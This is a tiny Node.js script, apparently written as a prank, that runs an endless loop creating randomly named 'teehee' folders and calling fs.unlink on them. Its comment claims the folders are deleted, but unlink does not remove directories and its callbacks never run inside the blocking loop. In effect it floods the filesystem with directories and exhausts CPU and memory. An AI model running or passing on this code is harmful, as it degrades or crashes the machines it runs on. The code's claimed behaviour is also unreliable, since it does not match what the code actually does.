const fs = require("fs");
const folderName = "teehee";

// Creates and deletes folders as fast as it can
while (true) {
  const r = Math.random();
  try {
    fs.mkdirSync(folderName + r);
    fs.unlink(folderName + r, () => { });
  } catch (e) { }
}